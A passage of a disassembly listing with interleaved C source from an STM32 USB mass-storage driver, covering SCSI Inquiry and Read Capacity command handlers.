  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b42:	7af9      	ldrb	r1, [r7, #11]
 8009b44:	233a      	movs	r3, #58	; 0x3a
 8009b46:	2202      	movs	r2, #2
 8009b48:	68f8      	ldr	r0, [r7, #12]
 8009b4a:	f000 fb5b 	bl	800a204 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b4e:	697b      	ldr	r3, [r7, #20]
 8009b50:	2205      	movs	r2, #5
 8009b52:	721a      	strb	r2, [r3, #8]

    return -1;
 8009b54:	f04f 33ff 	mov.w	r3, #4294967295
 8009b58:	e003      	b.n	8009b62 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009b5a:	697b      	ldr	r3, [r7, #20]
 8009b5c:	2200      	movs	r2, #0
 8009b5e:	60da      	str	r2, [r3, #12]

  return 0;
 8009b60:	2300      	movs	r3, #0
}
 8009b62:	4618      	mov	r0, r3
 8009b64:	3718      	adds	r7, #24
 8009b66:	46bd      	mov	sp, r7
 8009b68:	bd80      	pop	{r7, pc}
	...

08009b6c <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b6c:	b580      	push	{r7, lr}
 8009b6e:	b088      	sub	sp, #32
 8009b70:	af00      	add	r7, sp, #0
 8009b72:	60f8      	str	r0, [r7, #12]
 8009b74:	460b      	mov	r3, r1
 8009b76:	607a      	str	r2, [r7, #4]
 8009b78:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b7a:	68fb      	ldr	r3, [r7, #12]
 8009b7c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009b80:	68fb      	ldr	r3, [r7, #12]
 8009b82:	32b0      	adds	r2, #176	; 0xb0
 8009b84:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009b88:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009b8a:	69bb      	ldr	r3, [r7, #24]
 8009b8c:	2b00      	cmp	r3, #0
 8009b8e:	d102      	bne.n	8009b96 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009b90:	f04f 33ff 	mov.w	r3, #4294967295
 8009b94:	e062      	b.n	8009c5c <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009b96:	69bb      	ldr	r3, [r7, #24]
 8009b98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b9c:	699b      	ldr	r3, [r3, #24]
 8009b9e:	2b00      	cmp	r3, #0
 8009ba0:	d10b      	bne.n	8009bba <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009ba2:	69bb      	ldr	r3, [r7, #24]
 8009ba4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ba8:	7f59      	ldrb	r1, [r3, #29]
 8009baa:	2320      	movs	r3, #32
 8009bac:	2205      	movs	r2, #5
 8009bae:	68f8      	ldr	r0, [r7, #12]
 8009bb0:	f000 fb28 	bl	800a204 <SCSI_SenseCode>
    return -1;
 8009bb4:	f04f 33ff 	mov.w	r3, #4294967295
 8009bb8:	e050      	b.n	8009c5c <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009bba:	687b      	ldr	r3, [r7, #4]
 8009bbc:	3301      	adds	r3, #1
 8009bbe:	781b      	ldrb	r3, [r3, #0]
 8009bc0:	f003 0301 	and.w	r3, r3, #1
 8009bc4:	2b00      	cmp	r3, #0
 8009bc6:	d021      	beq.n	8009c0c <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009bc8:	687b      	ldr	r3, [r7, #4]
 8009bca:	3302      	adds	r3, #2
 8009bcc:	781b      	ldrb	r3, [r3, #0]
 8009bce:	2b00      	cmp	r3, #0
 8009bd0:	d105      	bne.n	8009bde <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009bd2:	2206      	movs	r2, #6
 8009bd4:	4923      	ldr	r1, [pc, #140]	; (8009c64 <SCSI_Inquiry+0xf8>)
 8009bd6:	69b8      	ldr	r0, [r7, #24]
 8009bd8:	f001 f8fa 	bl	800add0 <SCSI_UpdateBotData>
 8009bdc:	e03d      	b.n	8009c5a <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009bde:	687b      	ldr	r3, [r7, #4]
 8009be0:	3302      	adds	r3, #2
 8009be2:	781b      	ldrb	r3, [r3, #0]
 8009be4:	2b80      	cmp	r3, #128	; 0x80
 8009be6:	d105      	bne.n	8009bf4 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009be8:	2208      	movs	r2, #8
 8009bea:	491f      	ldr	r1, [pc, #124]	; (8009c68 <SCSI_Inquiry+0xfc>)
 8009bec:	69b8      	ldr	r0, [r7, #24]
 8009bee:	f001 f8ef 	bl	800add0 <SCSI_UpdateBotData>
 8009bf2:	e032      	b.n	8009c5a <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009bf4:	69bb      	ldr	r3, [r7, #24]
 8009bf6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bfa:	7f59      	ldrb	r1, [r3, #29]
 8009bfc:	2324      	movs	r3, #36	; 0x24
 8009bfe:	2205      	movs	r2, #5
 8009c00:	68f8      	ldr	r0, [r7, #12]
 8009c02:	f000 faff 	bl	800a204 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009c06:	f04f 33ff 	mov.w	r3, #4294967295
 8009c0a:	e027      	b.n	8009c5c <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c0c:	68fb      	ldr	r3, [r7, #12]
 8009c0e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c12:	68fa      	ldr	r2, [r7, #12]
 8009c14:	33b0      	adds	r3, #176	; 0xb0
 8009c16:	009b      	lsls	r3, r3, #2
 8009c18:	4413      	add	r3, r2
 8009c1a:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c1c:	69d9      	ldr	r1, [r3, #28]
 8009c1e:	7afa      	ldrb	r2, [r7, #11]
 8009c20:	4613      	mov	r3, r2
 8009c22:	00db      	lsls	r3, r3, #3
 8009c24:	4413      	add	r3, r2
 8009c26:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c28:	440b      	add	r3, r1
 8009c2a:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009c2c:	697b      	ldr	r3, [r7, #20]
 8009c2e:	3304      	adds	r3, #4
 8009c30:	781b      	ldrb	r3, [r3, #0]
 8009c32:	b29b      	uxth	r3, r3
 8009c34:	3305      	adds	r3, #5
 8009c36:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009c38:	687b      	ldr	r3, [r7, #4]
 8009c3a:	3304      	adds	r3, #4
 8009c3c:	781b      	ldrb	r3, [r3, #0]
 8009c3e:	b29b      	uxth	r3, r3
 8009c40:	8bfa      	ldrh	r2, [r7, #30]
 8009c42:	429a      	cmp	r2, r3
 8009c44:	d303      	bcc.n	8009c4e <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009c46:	687b      	ldr	r3, [r7, #4]
 8009c48:	3304      	adds	r3, #4
 8009c4a:	781b      	ldrb	r3, [r3, #0]
 8009c4c:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009c4e:	8bfb      	ldrh	r3, [r7, #30]
 8009c50:	461a      	mov	r2, r3
 8009c52:	6979      	ldr	r1, [r7, #20]
 8009c54:	69b8      	ldr	r0, [r7, #24]
 8009c56:	f001 f8bb 	bl	800add0 <SCSI_UpdateBotData>
  }

  return 0;
 8009c5a:	2300      	movs	r3, #0
}
 8009c5c:	4618      	mov	r0, r3
 8009c5e:	3720      	adds	r7, #32
 8009c60:	46bd      	mov	sp, r7
 8009c62:	bd80      	pop	{r7, pc}
 8009c64:	2000010c 	.word	0x2000010c
 8009c68:	20000114 	.word	0x20000114

08009c6c <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009c6c:	b590      	push	{r4, r7, lr}
 8009c6e:	b087      	sub	sp, #28
 8009c70:	af00      	add	r7, sp, #0
 8009c72:	60f8      	str	r0, [r7, #12]
 8009c74:	460b      	mov	r3, r1
 8009c76:	607a      	str	r2, [r7, #4]
 8009c78:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009c7a:	68fb      	ldr	r3, [r7, #12]
 8009c7c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009c80:	68fb      	ldr	r3, [r7, #12]
 8009c82:	32b0      	adds	r2, #176	; 0xb0
 8009c84:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009c88:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009c8a:	697b      	ldr	r3, [r7, #20]
 8009c8c:	2b00      	cmp	r3, #0
 8009c8e:	d102      	bne.n	8009c96 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009c90:	f04f 33ff 	mov.w	r3, #4294967295
 8009c94:	e075      	b.n	8009d82 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009c96:	68fb      	ldr	r3, [r7, #12]
 8009c98:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c9c:	68fa      	ldr	r2, [r7, #12]
 8009c9e:	33b0      	adds	r3, #176	; 0xb0
 8009ca0:	009b      	lsls	r3, r3, #2
 8009ca2:	4413      	add	r3, r2
 8009ca4:	685b      	ldr	r3, [r3, #4]
 8009ca6:	685c      	ldr	r4, [r3, #4]
 8009ca8:	697b      	ldr	r3, [r7, #20]
 8009caa:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009cae:	3308      	adds	r3, #8
 8009cb0:	697a      	ldr	r2, [r7, #20]
 8009cb2:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009cb6:	3204      	adds	r2, #4
 8009cb8:	7af8      	ldrb	r0, [r7, #11]
 8009cba:	4619      	mov	r1, r3
 8009cbc:	47a0      	blx	r4
 8009cbe:	4603      	mov	r3, r0
 8009cc0:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009cc2:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009cc6:	2b00      	cmp	r3, #0
 8009cc8:	d106      	bne.n	8009cd8 <SCSI_ReadCapacity10+0x6c>
 8009cca:	697b      	ldr	r3, [r7, #20]
 8009ccc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cd0:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009cd4:	2b02      	cmp	r3, #2
 8009cd6:	d108      	bne.n	8009cea <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009cd8:	7af9      	ldrb	r1, [r7, #11]
 8009cda:	233a      	movs	r3, #58	; 0x3a
 8009cdc:	2202      	movs	r2, #2
 8009cde:	68f8      	ldr	r0, [r7, #12]
 8009ce0:	f000 fa90 	bl	800a204 <SCSI_SenseCode>
    return -1;
 8009ce4:	f04f 33ff 	mov.w	r3, #4294967295
 8009ce8:	e04b      	b.n	8009d82 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009cea:	697b      	ldr	r3, [r7, #20]
 8009cec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cf0:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009cf2:	3b01      	subs	r3, #1
 8009cf4:	0e1b      	lsrs	r3, r3, #24
 8009cf6:	b2da      	uxtb	r2, r3
 8009cf8:	697b      	ldr	r3, [r7, #20]
 8009cfa:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009cfc:	697b      	ldr	r3, [r7, #20]
 8009cfe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d02:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d04:	3b01      	subs	r3, #1
 8009d06:	0c1b      	lsrs	r3, r3, #16
 8009d08:	b2da      	uxtb	r2, r3
 8009d0a:	697b      	ldr	r3, [r7, #20]
 8009d0c:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d0e:	697b      	ldr	r3, [r7, #20]
 8009d10:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d14:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d16:	3b01      	subs	r3, #1
 8009d18:	0a1b      	lsrs	r3, r3, #8
 8009d1a:	b2da      	uxtb	r2, r3
 8009d1c:	697b      	ldr	r3, [r7, #20]
 8009d1e:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009d20:	697b      	ldr	r3, [r7, #20]
 8009d22:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d26:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d28:	b2db      	uxtb	r3, r3
 8009d2a:	3b01      	subs	r3, #1
 8009d2c:	b2da      	uxtb	r2, r3
 8009d2e:	697b      	ldr	r3, [r7, #20]
 8009d30:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009d32:	697b      	ldr	r3, [r7, #20]
 8009d34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d38:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d3c:	161b      	asrs	r3, r3, #24
 8009d3e:	b2da      	uxtb	r2, r3
 8009d40:	697b      	ldr	r3, [r7, #20]
 8009d42:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009d44:	697b      	ldr	r3, [r7, #20]
 8009d46:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d4a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d4e:	141b      	asrs	r3, r3, #16
 8009d50:	b2da      	uxtb	r2, r3
 8009d52:	697b      	ldr	r3, [r7, #20]
 8009d54:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009d56:	697b      	ldr	r3, [r7, #20]
 8009d58:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d5c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d60:	0a1b      	lsrs	r3, r3, #8
 8009d62:	b29b      	uxth	r3, r3
 8009d64:	b2da      	uxtb	r2, r3
 8009d66:	697b      	ldr	r3, [r7, #20]
 8009d68:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009d6a:	697b      	ldr	r3, [r7, #20]
 8009d6c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d70:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d74:	b2da      	uxtb	r2, r3
 8009d76:	697b      	ldr	r3, [r7, #20]
 8009d78:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009d7a:	697b      	ldr	r3, [r7, #20]
 8009d7c:	2208      	movs	r2, #8
 8009d7e:	60da      	str	r2, [r3, #12]

  return 0;
 8009d80:	2300      	movs	r3, #0

}
 8009d82:	4618      	mov	r0, r3
 8009d84:	371c      	adds	r7, #28
 8009d86:	46bd      	mov	sp, r7
 8009d88:	bd90      	pop	{r4, r7, pc}

08009d8a <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d8a:	b590      	push	{r4, r7, lr}
 8009d8c:	b089      	sub	sp, #36	; 0x24
 8009d8e:	af00      	add	r7, sp, #0
 8009d90:	60f8      	str	r0, [r7, #12]
 8009d92:	460b      	mov	r3, r1
 8009d94:	607a      	str	r2, [r7, #4]
 8009d96:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d98:	68fb      	ldr	r3, [r7, #12]
 8009d9a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d9e:	68fb      	ldr	r3, [r7, #12]
 8009da0:	32b0      	adds	r2, #176	; 0xb0
 8009da2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009da6:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009da8:	69bb      	ldr	r3, [r7, #24]
 8009daa:	2b00      	cmp	r3, #0
 8009dac:	d102      	bne.n	8009db4 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009dae:	f04f 33ff 	mov.w	r3, #4294967295
 8009db2:	e0ab      	b.n	8009f0c <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009db4:	68fb      	ldr	r3, [r7, #12]
 8009db6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009dba:	68fa      	ldr	r2, [r7, #12]
 8009dbc:	33b0      	adds	r3, #176	; 0xb0
 8009dbe:	009b      	lsls	r3, r3, #2
 8009dc0:	4413      	add	r3, r2
 8009dc2:	685b      	ldr	r3, [r3, #4]
 8009dc4:	685c      	ldr	r4, [r3, #4]
 8009dc6:	69bb      	ldr	r3, [r7, #24]
 8009dc8:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009dcc:	3308      	adds	r3, #8
 8009dce:	69ba      	ldr	r2, [r7, #24]
 8009dd0:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009dd4:	3204      	adds	r2, #4
 8009dd6:	7af8      	ldrb	r0, [r7, #11]
 8009dd8:	4619      	mov	r1, r3
 8009dda:	47a0      	blx	r4
 8009ddc:	4603      	mov	r3, r0
 8009dde:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009de0:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009de4:	2b00      	cmp	r3, #0
 8009de6:	d106      	bne.n	8009df6 <SCSI_ReadCapacity16+0x6c>
 8009de8:	69bb      	ldr	r3, [r7, #24]
 8009dea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dee:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009df2:	2b02      	cmp	r3, #2
 8009df4:	d108      	bne.n	8009e08 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009df6:	7af9      	ldrb	r1, [r7, #11]
 8009df8:	233a      	movs	r3, #58	; 0x3a
 8009dfa:	2202      	movs	r2, #2
 8009dfc:	68f8      	ldr	r0, [r7, #12]
 8009dfe:	f000 fa01 	bl	800a204 <SCSI_SenseCode>
    return -1;
 8009e02:	f04f 33ff 	mov.w	r3, #4294967295
 8009e06:	e081      	b.n	8009f0c <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e08:	687b      	ldr	r3, [r7, #4]
 8009e0a:	330a      	adds	r3, #10
 8009e0c:	781b      	ldrb	r3, [r3, #0]
 8009e0e:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e10:	687b      	ldr	r3, [r7, #4]
 8009e12:	330b      	adds	r3, #11
 8009e14:	781b      	ldrb	r3, [r3, #0]
 8009e16:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e18:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e1a:	687b      	ldr	r3, [r7, #4]
 8009e1c:	330c      	adds	r3, #12
 8009e1e:	781b      	ldrb	r3, [r3, #0]
 8009e20:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e22:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009e24:	687a      	ldr	r2, [r7, #4]
 8009e26:	320d      	adds	r2, #13
 8009e28:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009e2a:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e2c:	69bb      	ldr	r3, [r7, #24]
 8009e2e:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e30:	2300      	movs	r3, #0
 8009e32:	61fb      	str	r3, [r7, #28]
 8009e34:	e008      	b.n	8009e48 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009e36:	69ba      	ldr	r2, [r7, #24]
 8009e38:	69fb      	ldr	r3, [r7, #28]
 8009e3a:	4413      	add	r3, r2
 8009e3c:	3310      	adds	r3, #16
 8009e3e:	2200      	movs	r2, #0
 8009e40:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e42:	69fb      	ldr	r3, [r7, #28]
 8009e44:	3301      	adds	r3, #1
 8009e46:	61fb      	str	r3, [r7, #28]
 8009e48:	69bb      	ldr	r3, [r7, #24]
 8009e4a:	68db      	ldr	r3, [r3, #12]
 8009e4c:	69fa      	ldr	r2, [r7, #28]
 8009e4e:	429a      	cmp	r2, r3
 8009e50:	d3f1      	bcc.n	8009e36 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009e52:	69bb      	ldr	r3, [r7, #24]
 8009e54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e58:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e5a:	3b01      	subs	r3, #1
 8009e5c:	0e1b      	lsrs	r3, r3, #24
 8009e5e:	b2da      	uxtb	r2, r3
 8009e60:	69bb      	ldr	r3, [r7, #24]
 8009e62:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009e64:	69bb      	ldr	r3, [r7, #24]
 8009e66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e6a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e6c:	3b01      	subs	r3, #1
 8009e6e:	0c1b      	lsrs	r3, r3, #16
 8009e70:	b2da      	uxtb	r2, r3
 8009e72:	69bb      	ldr	r3, [r7, #24]
 8009e74:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009e76:	69bb      	ldr	r3, [r7, #24]
 8009e78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e7c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e7e:	3b01      	subs	r3, #1
 8009e80:	0a1b      	lsrs	r3, r3, #8
 8009e82:	b2da      	uxtb	r2, r3
 8009e84:	69bb      	ldr	r3, [r7, #24]
 8009e86:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009e88:	69bb      	ldr	r3, [r7, #24]
 8009e8a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e8e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e90:	b2db      	uxtb	r3, r3
 8009e92:	3b01      	subs	r3, #1
 8009e94:	b2da      	uxtb	r2, r3
 8009e96:	69bb      	ldr	r3, [r7, #24]
 8009e98:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009e9a:	69bb      	ldr	r3, [r7, #24]
 8009e9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ea0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ea4:	161b      	asrs	r3, r3, #24
 8009ea6:	b2da      	uxtb	r2, r3
 8009ea8:	69bb      	ldr	r3, [r7, #24]
 8009eaa:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009eac:	69bb      	ldr	r3, [r7, #24]
 8009eae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eb2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009eb6:	141b      	asrs	r3, r3, #16
 8009eb8:	b2da      	uxtb	r2, r3
 8009eba:	69bb      	ldr	r3, [r7, #24]
 8009ebc:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009ebe:	69bb      	ldr	r3, [r7, #24]
 8009ec0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ec4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ec8:	0a1b      	lsrs	r3, r3, #8
 8009eca:	b29b      	uxth	r3, r3
 8009ecc:	b2da      	uxtb	r2, r3
 8009ece:	69bb      	ldr	r3, [r7, #24]
 8009ed0:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009ed2:	69bb      	ldr	r3, [r7, #24]
 8009ed4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ed8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009edc:	b2da      	uxtb	r2, r3
 8009ede:	69bb      	ldr	r3, [r7, #24]
 8009ee0:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ee2:	687b      	ldr	r3, [r7, #4]
 8009ee4:	330a      	adds	r3, #10
 8009ee6:	781b      	ldrb	r3, [r3, #0]
 8009ee8:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009eea:	687b      	ldr	r3, [r7, #4]
 8009eec:	330b      	adds	r3, #11
 8009eee:	781b      	ldrb	r3, [r3, #0]
 8009ef0:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ef2:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009ef4:	687b      	ldr	r3, [r7, #4]
 8009ef6:	330c      	adds	r3, #12
 8009ef8:	781b      	ldrb	r3, [r3, #0]
 8009efa:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009efc:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009efe:	687a      	ldr	r2, [r7, #4]
 8009f00:	320d      	adds	r2, #13
 8009f02:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009f04:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f06:	69bb      	ldr	r3, [r7, #24]
 8009f08:	60da      	str	r2, [r3, #12]

  return 0;
 8009f0a:	2300      	movs	r3, #0
}
 8009f0c:	4618      	mov	r0, r3
 8009f0e:	3724      	adds	r7, #36	; 0x24
 8009f10:	46bd      	mov	sp, r7
 8009f12:	bd90      	pop	{r4, r7, pc}

08009f14 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f14:	b580      	push	{r7, lr}
 8009f16:	b088      	sub	sp, #32
 8009f18:	af00      	add	r7, sp, #0
 8009f1a:	60f8      	str	r0, [r7, #12]
 8009f1c:	460b      	mov	r3, r1
 8009f1e:	607a      	str	r2, [r7, #4]
 8009f20:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
